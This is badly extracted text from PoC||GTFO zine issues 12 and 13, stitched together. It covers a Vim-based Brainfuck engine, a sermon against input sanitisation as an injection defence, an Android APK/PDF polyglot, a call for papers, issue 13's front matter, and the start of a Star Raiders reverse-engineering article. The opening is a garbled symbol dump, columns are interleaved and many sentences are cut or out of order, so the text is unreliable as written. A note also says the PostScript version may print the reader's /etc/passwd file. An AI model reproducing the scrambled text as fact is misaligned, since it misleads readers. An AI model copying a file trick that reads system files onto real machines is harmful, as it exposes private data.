_v . $7yy_ . − ‘ tyw ‘ a /_\ ( ^R" \ | uuu \ ) ^ M e l l y l ‘ op$mo ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ " X e l l y
_$ ‘ p mpy ‘ p y l ‘ a_, − ‘ i y
mi ‘ a / ^R"_^MT_ye‘ t v t p ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X_# −
7
9
11
13
15 _o :
17
19
21
23
25
_i :
100^M
_t :
0 0
0 0
0 0
0 0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
0
27 _a :
___0 . ___1 . ___2 . ___3 . ___4 . ___5 . ___6 . ___7 . ___8 . ___9 . __10 ^M_11 . __12 . __13 . __14 . __15 . _
29 __16 . __17 . __18 . __19 . __20 . __21 . __22 . __23 . __24 . __25 . __26 . __27 . __28 . __29 . __30 . __31 . _
__32
__33 ! __34 "__35 #__36 $__37 %__38 &__39 ‘ __40 ( __41 ) __42 ∗__43 +__44 , __45 −__46 . __47 /_
31 __48 0__49 1__50 2__51 3__52 4__53 5__54 6__55 7__56 8__57 9__58 : __59 ; __60 <__61 =__62 >__63 ?_
__64 @__65 A__66 B__67 C__68 D__69 E__70 F__71 G__72 H__73 I__74 J__75 K__76 L__77 M__78 N__79 O_
33 __80 P__81 Q__82 R__83 S__84 T__85 U__86 V__87 W__88 X__89 Y__90 Z__91 [ __92 \__93 ] __94 ^__95 __
__96 ‘ __97 a__98 b__99 c_100 d_101 e_102 f_103 g_104 h_105 i _ 1 0 6 j_107 k_108 l _ 1 0 9 m_110 n_111 o_
35 _112 p_113 q_114 r_115 s_116 t_117 u_118 v_119 w_120 x_121 y_122 z_123 { _124 | _125 } _126 ~_127 . _
_uuu .
37
_p :
39 +[ − >, −−−−−−−−−−[<+> −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−− >[>+>+<< −]>>[<<+>> −]<>>>+++++++++[<<<[>+
>+<<−]>>[<<+>>−]<[<<+>>−]>>−]<<<[−]<<[>+<−]]<]>>[<<+>>−]<<>+<−[>+[>+>+<<−]>>[<<+>>−]<>+<−−>>>>>>>
41 >+<<<<<<<<[>+<−<[>>>+>+<<<<−]>>>>[<<<<+>>>>−]<<<>[>>+>+<<<−]>>>[<<<+>>>−]<<<<>>>[>+>+<<−]>>[<<+>>
−]<<<[>>>>>+<<<[>+>+<<−]>>[<<+>>−]<[>>[−]<<−]>>[<<<<[>+>+<<−]>>[<<+>>−]<>>>−]<<<−<<−]+>>[<<[−]>>−
43 ]<<>[−]<[>>>>>>[−]<<<<<<−]<<>>[−]>[−]<<<]>>>>>>>>[−<<<<<<<[−]<<[>>+>+<<<−]>>>[<<<+>>>−]<<<>>[>+<−
]>[[>+>+<<−]>>[<<+>>−]<>+++++++++<[>>>+<<[>+>[−]<<−]>[<+>−]>[<<++++++++++>>−]<<−<−]+++++++++>[<−>
45 −]<[>+<−]<[>+<−]<[>+<−]>>>[<<<+>>>−]<>+++++++++<[>>>+<<[>+>[−]<<−]>[<+>−]>[<<++++++++++>>>+<−]<<−
<−]>>>>[<<<<+>>>>−]<<<<>[−]<<+>]<[[>+<−]+++++++[<+++++++>−]<−><.[−]>>[<<+>>−]<<−]>++++[<++++++++>
47 −]<.[−]>>>>>>>]<<<<<<<<>[−]<[−]<<−]++++++++++.[−]#
Figure 20 – VIM Execution Engine
we have already shown - could be used to implement
%’s functionality in a more perfect manner; we leave
this as an exercise for the purists.
But lo! With the implementation of the 8 BF
instructions, our execution engine is complete! Fig-
ure 20 shows a cleanly formatted version of the
final machine. The demonstration machine uses
our copy/paste/search/replace commands to calcu-
late the prime numbers up to 100. For ease of
use, we add an introductory %s search and replace
sequence—momentarily allowing ourselves to enter
ex commands—in order to insert the control char-
acters (ˆ M, ˆ R, etc.) needed throughout the rest
of the machine. This provides us a pure-ASCII file,
without the need to enter special characters. Simply
copy the below, paste into vanilla vim, launch with
gg2yy@", and witness the awesome Turing-complete
power of our benevolent editor! 54
54 unzip pocorgtfo12.pdf vimmmex.tar.gz
git clone https://github.com/xoreaxeaxeax/vimmmex
7510
Doing Right by Neighbor O’Hara
by Andreas Bogk
Knight in the Grand Recursive Order of the Knights of the Lambda Calculus
Priest in the House of the Apostles of Eris
What good is a pulpit that can’t be occasionally shared with a neighborly itinerant preacher? In this fine
sermon, Sir Andreas warns us of the heresy that “input sanitation” will somehow protect you from injection
attacks, no matter what comes next for the inputs you’ve “sanitized”—and vouchsafes the true prophecy of
parsing and unparsing working together, keeping your inputs and outputs valid, both coming and going.
—PML
Brothers, Sisters, and Variations Thereupon!
Let me introduce you to a good neighbor. Her
name is O’Hara and she was born on January 1st
in the year 1970 in Dublin. She’s made quite an
impressive career, and now lives in a nice house in
Scunthorpe, UK, working remotely for AT&T.
I ask you, neighbors: would you deny our neigh-
bor O’Hara in the name of SQL injection preven-
tion? Or would you deny her date of birth, just
because you happen to represent it as zero in your
verification routine? Would you deny her place of
work, as abominable as it might be? Or would you
even deny her place of living, just because it contains
a sequence of letters some might find offensive?
You say no, and of course you’d say no! As her
name and date of birth and employer and place of
residence, they are all valid inputs. And thou shalt
not reject any valid input; that truly would not be
neighborly!
But wasn’t input filtering a.k.a. “sanitization”
the right thing to do? Don’t characters like ’ and &
wreak unholy havoc upon your backend SQL inter-
preter or your XHTML generator?
So where did we go wrong by the neighbor
O’Hara?
Is the number 0 evil and unclean, no matter what,
despite historians of mathematics raving about its
invention? Are certain sounds unspeakable, regard-
less of where and when one may speak them?
No, no, and no—for all bytes are created equal,
and their interpretation depends solely on the con-
text they are interpreted in. As any miracle cure,
this snake oil of “sanitization” claims a grain of
truth, but entirely misses its point. No byte is in-
herently “dirty” so as to be “sanitized” as such—but
context and interpretation happeneth to them all,
and unless you know what these context and the in-
terpretations are, your “sanitization” is useless, nay,
harmful and unneighborly to O’Hara.
The point is, neighbors, that at the input time
you cannot possibly know the context of the output.
Your input sanitation scheme might work to protect
your backend for now—and then a developer comes
and adds an LDAP backend, and another comes and
inserts data into a JavaScript literal in your web
page template. Then another comes and adds an
additional output encoding layer for your input—
and what looked safe to you at the outset crumbles
to dust.
There is a false prophesy making the rounds
that you can protect against undesirable injection
into your system by “input sanitization,” no matter
where your “sanitized” inputs go from there, and no
matter how they then get interpreted or rendered.
This “sanitization” is а heathen fetish, neighbors,
and the whole thing is dangerous foolery that we
need to drive out of the temple of proper input-
handling.
Indeed, is the apostrophe character so inherently
dirty and evil, that we need to “sanitize” them out?
Why, then, are we using this evil character at all?
76input—but also make sure you have the output cov-
ered!
This is the true meaning of the words of prophets:
input validation, however useful, cannot not prevent
injection attacks, the same way washing your hands
will not prevent breaking your leg. Your output is
a language too, and unless you generate it in full
understanding of what it is—that is, unparse your
data to the proper specification of whatever code
consumes it—that code is pwned.
Parsing and unparsing are like unto the two
wings of the dove. Neglect one, and you will not get
you an olive branch of safety—nay, it will never even
leave your ark, but will flap uselessly about. Do not
hobble it, neighbors, but let it fly true—doing right
by neighbors like O’Hara both coming and going!
EOL, EOF, and EOT!
The ancient prophets of LISP knew that, for they
fully specified both what their machine read, and
what it printed, in the holy REPL, the Read-Eval-
Print Loop. The P is just as important as the R
or even the E—for without it everything falls to the
ground in the messy heaps that bring about XSS,
memory corruption, and packet-in-packet. Pretty-
printing may sound quaint, a matter unnecessary
for “real programmers,” but it is in fact deep and
subtle—it is unparsing, which produces the represen-
tation of parsed data suitable for the next context
it is consumed in. They knew to specify it precisely,
and so should you.
So what does the true prophecy look like? Verily
sanitize your input—to the validity expectations you
have of it. Yet be clear what this really means, and
treat the output with as much care as you treat the
input—because the output is a language too, and
must be produced according to its own grammar,
just as validating to the input grammar is the only
hope of keeping your handler from pwnage.
Sanity in input is important in structured data.
When you expect XML, you shall verify it is XML.
When you expect XML with a Schema, also verify
the schema. Expecting JSON? Make sure you got
handed valid JSON. Use a parser with the appro-
priate power, as LangSec commands. Yet, if your
program were to produce even a single byte of out-
put, ask—what is the context of that output? What
is the expected grammar? For verily you cannot
know it from just the input specification.
Any string of characters is likely to be a valid
name. There is nothing you should really do for
“sanitation,” except making sure the character en-
coding is valid. If your neighbor is called O’Hara,
or Tørsby, or Åke, make sure you can handle this
777811
Are All Androids Polyglots or Only C-3PO?
by Philippe Teuwen
$ pm install /sdcard/pocorgtfo12.pdf
That’s all it takes to install this polyglot as an
Android application. So what’s the Jedi mind trick?
But I expect most readers—well, only those crazy
enough to give execute permission to the Pastor on
their terminals—to install it via the Android Debug
Bridge tool adb. This method expects the applica-
tion package filename to end in .apk, so let’s humor
it:
Basically, we merged the content of an Android
application with the ZIP feelies. (Please excuse the
cruft you’ll find in the feelies!)
Now I won’t teach you anything if I tell you that
an APK is just a ZIP. It is, of course, a ZIP, but not
just, if we also want it to be an Android app; we
need the application itself, for one thing, and then
some.
$ ln -s pocorgtfo12.pdf pocorgtfo12.apk
$ adb install pocorgtfo12.apk
The Android OS requires all applications to be
signed in order to be installed, so our polyglot needs
to be signed by our Pastor, which is actually not
a bad practice. Beyond this, Android doesn’t re-
ally care about what else the ZIP could be (e.g., it
can be a PDF, as is the glorious PoCkGTFO tra-
dition), but the trick is that all of the archive con-
tents must be signed. In particular, this must in-
clude all the original feelies, as you can observe in
META-INF/MANIFEST.MF.
But what does this application do? Not much,
really. It copies itself (the installed APK) to
/sdcard/pocorgtfo12.pdf and opens the copy
with your preferred PDF reader.
Note: Imperial security is improving and on the
latest versions of the OS, even if this ’droid polyglot
gets installed, it may fail in dex2oat. You may need
to develop your own Jedi tricks to tell them these
are not the droids they are looking for—and if you
do, please send them to us! 55
And you, my friend, are you a polyglot? Let’s
celebrate this fine Québécoise release with a classic
charade!
The resulting polyglot can be installed directly
if dropped on /sdcard/, as well as locally, by using
the Android Package Manager as shown above.
55 This has been finally solved in time for this electronic release. Use the Force to unravel its secrets... You may even propagate
it neighbourly by Near Force Communication, in which case Padawans have first to accept apks from unknown sources.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Charade des temps modernes
Mon
Mon
Mon
Mon
premier est le nombre de Messier de la Galaxie d’Andromède.
second est la somme de quatre nombres premiers consécutifs commençant par 41.
troisième est le nombre atomique de l’Unennquadium.
quatrième est le nombre modèle qui succéda au Sinclair ZX80.
Mon tout lève tous les obstacles sur le chemin de la Science.
–——–
———
—–—–
———
–—–
79
——–
—
––—–
———12
Tithe us your Alms of 0day!
from the desk of Pastor Manul Laphroaig,
International Church of the Weird Machines
Dear neighbors,
It’s easy to feel down in these dark times. The
prices are up, the stocks are down, and even in this
twenty first century, innocent kids are imprisoned
or driven to the brink of madness in the name of
justice.
But don’t despair! There are clever things to be
done and good conversations to be had, while the
barbarians aren’t yet at our door.
I have a good friend named Jacob. He’s a bar-
tender, but to his regulars, he is a professional con-
versation pimp. When you sit down at his bar by
yourself, you’ll barely have time to take that first
sip of your whiskey before he introduces you to Al-
ice and Bob, as you all three do something with that
fancy cryptography stuff.
Or he might introduce you to Mallory, as you
both enjoy a malicious prank or two. Or to Sergey,
as you both enjoy rare cat pictures.
And when it’s too early or too late for him to in-
troduce you to a new friend, he’ll strike up a conver-
sation himself like those bartenders do on television
shows, but so rarely in real life.
So be like Jacob, and make the world a better
place through good conversation. Verily I tell you,
Jacob’s bar, and our pews, and the timbers of what-
ever roof you strike a friendly conversation under are
all part of the same great ladder of neighborliness!
Do this: write an email telling our editors how
to reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian, and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. Don’t try to make it thorough
or broad. Don’t use bullet-points, as this isn’t a
damned Powerpoint deck. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Don’t tell me that it’s possible; rather, teach me
how to do it myself with the absolute minimum of
formality and bullshit.
Like an email, we expect informal (or faux-
biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing
for your poor preacherman to do over a bottle of
fine scotch. Send this to pastor@phrack org and
hope that the neighborly Phrack folks—praise be to
them!—aren’t man-in-the-middling our submission
process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, D D
80PoC|| GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
o
r
G
e
t
T
h
e
F
u
c
k
O
u
t
PASTOR LAPHROAIG’S MERCY SHIP
HOLDS STONES FROM THE IVORY TOWER,
BUT ONLY AS BALLAST!
13:2 Atari Star Raiders 13:6 A Rogue Strategy for Spinlocks
13:3 Slowing Down a Race Condition 13:7 Reverse Engineering LoRa’s PHY
13:4 Glitching Attacks over USB; or, 13:8 Concerning Plumbers and Popper
A Wacom Tablet Reads RFIDs
13:5 Running AMBE Firmware in Linux
13:9 Where is ShimDBC.exe?
13:10 Postscript for Schizophrenic Ghosts
Üres hasnak elég a szép szó; это самиздат. pocorgtfo13.pdf. October 18, 2016.
e0, $0 USD, 10s 6d GBP, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő).Legal Note: In solidarity with , the Author Formerly Known as Homer Hickam, we place no restrictions
of any kind upon our authors. They are quite welcome to do whatever the hell they like with their own
work, in any medium they like, including but not limited to endeavors of theater and interpretive dance.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo13.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
http://www.sultanik.com/pocorgtfo/
Technical Note: As described in PoCkGTFO 13:10, pocorgtfo13.pdf is a polyglot that may be inter-
preted as both a PDF and a PostScript file. As a PDF, this file is mostly harmless, but we warn you that
the Postscript will render differently each time, including both a randomly generated maze and—if Tavis
Ormandy hasn’t killed such a lovely bug yet—a copy of your /etc/passwd file.
Cover Art: The cover artwork from this issue is by Harry Clarke, first used to illustrate the poem Sea
Fever by John Masefield in the collection The Year’s at the Spring, 1920.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper in
Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3 (280 mm
x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo13.pdf -o pocorgtfo13-book.pdf
Man of The Book
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
and sundry others
21
Read me if you want to live!
pleting his reverse engineering project, giving him
the rare opportunity to confirm his understanding
of the game’s design and behavior.
On page 24, James Forshaw introduces us to a
nifty little trick for simplifying reliable exploitation
of race condition vulnerabilities. Rather than spin
up a dozen attempts to improve racetrack odds, he
instead induces situations with pathological perfor-
mance penalties to Windows NT system calls, stun-
ning the threads of execution that might interfere
with his exploit for twenty minutes or more!
Micah Elizabeth Scott continues to send us bril-
liant articles that refuse to be described by a single
abstract, so let’s just say that on page 30 she ex-
plains a USB magic trick in which her FaceWhis-
perer board—combining the Facedancer and the
Chip Whisperer—is able to reliably glitch the USB
stack of an embedded device to dump its firmware.
Or, we could say that on page 30 she explains how
to use undocumented commands from that firmware
dump to program the Harvard device by ROP. Or,
we could say that on page 30 she shows you to read
RFID tags with a Wacom tablet. These tricks are
all the same article, and you’d be a fool not to read
it.
Neighbors, please join me in reading this four-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse en-
gineering and worshippers of weird machines. This
fourteenth release is given on paper to the fine neigh-
bors of São Paulo, San Diego, and Budapest.
If you are missing the first thirteen issues, we the
editors suggest pirating them from the usual loca-
tions, or on paper from a neighbor who picked up a
copy of the first in Vegas, the second in São Paulo,
the third in Hamburg, the fourth in Heidelberg, the
fifth in Montréal, the sixth in Las Vegas, the seventh
from his parents’ inkjet printer during the Thanks-
giving holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, or the thirteenth in Montréal.
After our paper release, and only when qual-
ity control has been passed, we will make an elec-
tronic release named pocorgtfo13.pdf. It is valid
as PDF, ZIP, and PostScript; please read it with
Adobe Reader, unzip, and gv.
We begin on page 5 with the story of how STAR
RAIDERS by Doug Neubauer for the Atari 400 was
taken apart by Lorenz Weist, from a mere ROM car-
tridge dump to annotated and literate 6502 disas-
sembly. By a stroke of luck, Lorenz was able to read
Doug’s original source code for the game after com-
3has a sermon for you on page 60. He reminds us
that science takes place neither on stage in front of
a live studio audience nor in committees and gov-
ernment offices, but over a glass of fine scotch that’s
accompanied by finer conversation of practitioners.
In the same way that we oughtn’t put Tim the “Tool
Man” Taylor in charge of vocational education, we
ought to leave the teaching of science to those who
do it, not those who talk about it on TV.
Geoff Chappell is an old-school reverse engineer,
an x86 archaeologist who has spent the past twenty-
four years reading Windows binaries to identify all
the forgotten features and corner cases that the rest
of us might take for granted. 1 On page 63, he
introduces us to the mystery of Microsoft’s Shim
Database Compiler, an unpublished tool for compil-
ing driver shims that doesn’t seem to be available
to the outside world. Geoff shows us that, in fact,
the tool is available, wrapped up inside of a GUI
as QFixApp.exe or CompatAdmin.exe. By patch-
ing the program to expose its intact winmain(), he
can recover the long-lost ShimDBC.exe for compiling
Windows driver compatibility shims from XML!
Evan Sultanik and Philippe Teuwen have teamed
up on page 71, to explain the inner workings of
pocorgtfo13.pdf, which you can rename to read
as pocorgtfo13.zip or pocorgtfo13.ps.
On page 72, the last page, we pass around the
collection plate. Our church has no interest in cash
or cheques, but we’d love your donation of a nifty
reverse engineering story. Please send one our way.
In PoCkGTFO 10:8, Travis Goodspeed jailbroke
the Tytera MD380 radio to allow for firmware ex-
traction and patching. Since then, a lively open
source project has sprung up, with fancy new fea-
tures and fixes to old bugs. On page 38, he describes
how to rip the AMBE audio codec out of the radio
firmware, transforming it into a command line audio
processing tool that runs on any Linux workstation.
Similar tricks can be used to quickly toss together
emulators for many ARM and PowerPC embedded
systems, re-using their library functions, or fuzzing
their parsers in the familiar environment of an ev-
eryday laptop.
Evan Sultanik is back with a safe cracking adven-
ture that could only be expressed as a play in three
acts, narrated by our own Pastor Manul Laphroaig.
Speaking parts are available for Alice Feynman, Bob
Schrute, Havva al-Kindi, and the ghost of Paul
Erdős. You’ll find Evan’s script on page 43.
Matt Knight has been reverse engineering the
PHY of LoRa, a low-power protocol for sub-GHz
wireless networking over long distances. On page 48
you will find not just the protocol details that al-
lowed him to write an open source receiver, but, far
more importantly, you will also find the methods by
which he reverse engineered this information from
captured packets, vague application notes, and the
outright lies of the patent application.
Pastor Manul Laphroaig, your friendly neighbor-
hood evangelist of the gospel of the weird machines,
1 Geoff was the first to discover Aaron R. Reynolds’ “AARD” code from the beta release of Windows 3.1 that intentionally
broke compatibility with DR-DOS. He also has a delightful article on exactly how AOL exploited a buffer overflow in their own
AOL Instant Messenger client to distinguish it from Microsoft’s clone, MSN Messenger.
42
Reverse Engineering Star Raiders
by Lorenz Wiest
2.1
Introduction
ered to be one of the ten most important computer
games of all time. 2 .
SYSTEM
RESET
OPTION
SELECT
START
1
2
PLYR
1
CONTROLLER
PLYR
2
JACKS
PLYR
3
3
4
PLYR
4
The game is a 3D space combat flight simulation
where you fly your starship through space , shooting
at attacking Zylon spaceships The game’s universe
is made up of a 16 × 8 grid of sectors Some of
them contain enemy Zylon units some a friendly
starbase The Zylon units converge toward the star-
bases and try to destroy them. The starbases serve
as repair and refueling points for your starship. You
move your starship between sectors with your hyper-
warp drive The game is over if you have destroyed
all Zylon ships, have ran out of energy, or if the
Zylons have destroyed all starbases.
.
At a time when home computer games were
pretty static – think SPACE INVADERS (1978) and
PAC MAN (1980) – STAR RAIDERS was a huge hit
because the game play centered on the very dynamic
3D first-person view out of your starship’s cockpit
window.
The original Atari 8-bit Home Computer System
STAR RAIDERS is a seminal computer game pub-
lished by Atari Inc. in 1979 as one of the first titles
for the original Atari 8-bit Home Computer System
(Atari 400 and Atari 800). It was written by Atari
engineer Doug Neubauer, who also created the sys-
tem’s POKEY sound chip. STAR RAIDERS is consid-
2 “Is
That Just Some Game? No, It’s a Cultural Artifact.” Heather Chaplin, The New York Times, March 12, 2007.
52.2
has up to 48 KB RAM and uses a Motorola 6502
CPU. The same CPU is also used in the Apple II,
the Commodore C64 (a 6502 variant), and the T-
800 Terminator 3 Several proprietary Atari custom
chips provide additional capabilities to the system.
STAR RAIDERS shows off many of them: 5 Play-
ers (sprites), mixed text and pixel graphics modes,
dynamic Display Lists, a custom character set, 4-
channel sound, Vertical Blank Interrupt and Dis-
play List Interrupt code – even the BCD mode of
the 6502 CPU is used
PULL
STAR RAIDERS is distributed as an 8 KB ROM car-
tridge, occupying memory locations $A000 to $BFFF.
The obvious first step was to prod a ROM dump
with a disassembler and to apply Atari’s published
hardware and OS symbols to the disassembly. To
my surprise this soon revealed that code and data
were clearly separated into three parts:
$A000 – $A149 Data (Part 1 of 2)
$A14A – $B8DE Code (6502 instructions)
$B8DF – $BFFF Data (Part 2 of 2)
This clear separation helped me instantly to get
an overview of the code part, as I could create a
disassembly of the code in one go and not having to
sift slowly through the bytes of the ROM, deciding
which ones are instructions and which ones are data.
Closer inspection of the code part revealed that it
was composed of neatly separated subroutines. Each
subroutine handles a specific task. The largest sub-
routine is the main game loop GAMELOOP ($A1F3),
shown in Figure 1. What I expected to be spaghetti
code – given the development tools of 1979 and the
substantial amount of game features crammed into
the 8K ROM – turned out to be surprisingly struc-
tured code. Table 1 lists all subroutines of STAR
RAIDERS , as their function emerged during the re-
verse engineering effort, giving a good overview how
the STAR RAIDERS code is organized.
Figure 2 shows the “genome sequence” of the
STAR RAIDERS 8 KB ROM: The 8192 bytes of the
game are stacked vertically, with each byte repre-
sented by a tiny, solid horizontal line of 8 pixels.
This stack is split into strips of 192 bytes, arranged
side-by-side. Alternating light and dark blue areas
represent bytes of distinct subroutines. Alternat-
ing light and dark green and purple areas repre-
sent bytes of distinct sections of data (lookup tables,
graphical shapes, etc.). When data bytes represent
graphical shapes, the solid line of a byte is replaced
by its actual bit pattern (in purple color).
There are a couple of interesting things to see:
OPEN
SYSTEM
RESET
OPTION
SELECT
C
START
CONTROLLER JACKS
1
2
3
4
Alpha-Numeric
Television
Interface
Controller
POtentiometer
KEYboard
integrated circuit
16bit freq counter mode
keyboard/paddle scanning
IRQ generator
display lists
1.77-1,79Mhz
SALLY
@angealbertini 2016
MOS
6502
Peripheral
Interface
Adaptor
OS
ROM
Sprites: player/missile
right
left
cartridge cartridge
16KB - 48KB
keyboard
speaker
Color/Graphics
Television
Interface Adaptor
processor bus
RAM
Getting Started
disk
drives
other
periph.
I have been always wondering what made STAR
I was especially curious how that
3D first-person view star field worked, in particu-
lar the rotations of the stars when you fly a turn.
So I decided to reverse engineer the game, aiming
at a complete, fully documented assembly language
source code of STAR RAIDERS .
RAIDERS tick.
;*********************************************************************
;*
*
;*
S T A R
R A I D E R S
*
;*
*
;*
for the Atari 8-bit Home Computer System
*
;*
*
;*
Reverse-engineered and documented assembly language source code
*
;*
*
;*
by
*
;*
*
;*
Lorenz Wiest
*
;*
*
;*
(lo.wiest(at)web.de)
*
;*
*
;*
First Release
*
;*
22-SEP-2015
*
;*
*
;*
Last Update
*
;*
10-AUG-2016
*
;*
*
;*
STAR RAIDERS was created by Douglas Neubauer
*
;*
STAR RAIDERS was published by Atari Inc.
*
;*
*
;*********************************************************************
In the following sections I’ll show you how I ap-
proached the reverse engineering effort, introduce
my favorite piece of code in STAR RAIDERS , talk
about how the tight memory limits influenced the
implementation, reveal some bugs, point at some
mysterious code, and explain how I got a grip on
documenting STAR RAIDERS . From time to time, to
provide some context to you, I will reference memory
locations of the game, which you can look up in the
reverse engineered, complete, and fully documented
assembly language source code of STAR RAIDERS
available on GitHub. 4
• The figure reflects the ROM’s separation into
a data part (green and purple), a code part
(blue), and one more data part (green and pur-
ple).
• The first data part contains mostly the custom
3 In
the movie TERMINATOR (1984) there are scenes showing the Terminator’s point of view in shades of red. In these
scenes lines of source code are listed onscreen. Close inspection of still frames of the movie reveal this to be 6502 assembly
language source code.
4 git clone https://github.com/lwiest/StarRaiders or unzip pocorgtfo13.pdf StarRaiders.zip
6Initialize program (cold start)
INITCOLD
$A14A
Entry point when SELECT function key was pressed
INITSELECT
$A15A
INITDEMO
$A15C
Entry point when program switches into demo mode
INITSTART
$A15E
$A1F3
Entry point when START function key was pressed
GAMELOOP
$A6D0
remaining tasks at the end
FLUSHGAMELOOP Handle
of a game loop iteration
$B4E4
Update title line
UPDTITLE
$B216
Rotate position vector component
ROTATE
(coordinate) by fixed angle
$B69B
HYPERWARP Handle hyperwarp
$A89B
Update Control Panel Display
UPDPANEL
$B804
pixel column (or row) number
PROJECTION Calculate
from position vector
$AA21
pixel row number
SCREENROW Calculate
from centered pixel row number
$B71E
pixel column number
SCREENCOLUMN Calculate
from centered pixel column number
$B6FB
NOISE
$AEA8
hyperwarp arrival location
SELECTWARP Select
on Galactic Chart
$B162
Copy noise sound pattern
Decrease energy
DECENERGY
$B86F
DRAWLINES
Draw horizontal and vertical lines
$A76F
Clear PLAYFIELD memory
CLRPLAYFIELD
$AE0D
Modify Display List
MODDLST
$ADF1
Initialize position vector of a space object
INITPOSVEC
$B764
Handle Game Over
GAMEOVER
$B10A
KEYBOARD Handle Keyboard Input
$AFFE
Set Front view
SETVIEW
$B045
Detect a collision of our starship's photon torpedoes
COLLISION
$AF3D
Initialize explosion
INITEXPL
$AC6B
Handle joystick trigger
TRIGGER
$AE29
DAMAGE
$AEE1
Update Attack Computer Display
UPDATTCOMP
$A7BF
Damage or destroy one of our starship's subsystems
our starship's and Zylon
MANEUVER Maneuver
photon torpedoes and Zylon ships
$AA79
Handle docking at starbase,
DOCKING
launch and return of transfer vessel
$ACE6
A B A is followed by B in memory
A B A jumps to B (no return)
A
B
A calls B (and returns)
Figure 1. Simplified Call Graph of Start Up and Game Loop
71 $A14A
$A15A
3 $A15C
$A15E
5 $A1F3
$A6D1
7 $A718
$A751
9 $A76F
$A782
11 $A784
$A7BF
13 $A89B
$A980
15 $A987
$A98D
17 $A9B4
$AA21
19 $AA79
$AC6B
21 $ACAF
$ACC1
23 $ACE6
$ADF1
25 $AE0D
$AE0F
27 $AE29
$AEA8
29 $AECA
$AEE1
31 $AF3D
$AFFE
33 $B045
$B07B
35 $B10A
$B121
37 $B162
$B1A7
39 $B216
$B223
41 $B2AB
$B3A6
43 $B3BA
$B4B9
45 $B4E4
$B69B
47 $B6FB
$B71E
49 $B764
$B7BE
51 $B7F1
$B804
53 $B86F
$B8A7
55
$B8CD
INITCOLD
INITSELECT
INITDEMO
INITSTART
GAMELOOP
VBIHNDLR
DLSTHNDLR
IRQHNDLR
DRAWLINES
DRAWLINE
DRAWLINE2
UPDATTCOMP
HYPERWARP
ABORTWARP
ENDWARP
CLEANUPWARP
INITTRAIL
PROJECTION
MANEUVER
INITEXPL
COPYPOSVEC
COPYPOSXY
DOCKING
MODDLST
CLRPLAYFIELD
CLRMEM
TRIGGER
NOISE
HOMINGVEL
DAMAGE
COLLISION
KEYBOARD
SETVIEW
UPDSCREEN
GAMEOVER
GAMEOVER2
SELECTWARP
CALCWARP
UPDTITLE
SETTITLE
SOUND
BEEP
INITIALIZE
DRAWGC
FLUSHGAMELOOP
ROTATE
SCREENCOLUMN
SCREENROW
INITPOSVEC
RNDINVXY
ISSURROUNDED
UPDPANEL
DECENERGY
SHOWCOORD
SHOWDIGITS
I n i t i a l i z e program ( Cold s t a r t )
Entry p o i n t when SELECT f u n c t i o n key was p r e s s e d
Entry p o i n t when program s w i t c h e s i n t o demo mode
Entry p o i n t when START f u n c t i o n key was p r e s s e d
Game l o o p
V e r t i c a l Blank I n t e r r u p t Handler
D i s p l a y L i s t I n t e r r u p t Handler
I n t e r r u p t Request (IRQ) Handler
Draw h o r i z o n t a l and v e r t i c a l l i n e s
Draw a s i n g l e h o r i z o n t a l o r v e r t i c a l l i n e
Draw b l i p i n Attack Computer
Update Attack Computer D i s p l a y
Handle hyperwarp
Abort hyperwarp
End hyperwarp
Clean up hyperwarp v a r i a b l e s
I n i t i a l i z e s t a r t r a i l d u r i n g STAR TRAIL PHASE o f hyperwarp
C a l c u l a t e p i x e l column ( o r row ) number from p o s i t i o n v e c t o r
Maneuver our s t a r s h i p ’ s and Zylon photon t o r p e d o e s and Zylon s h i p s
I n i t i a l i z e explosion
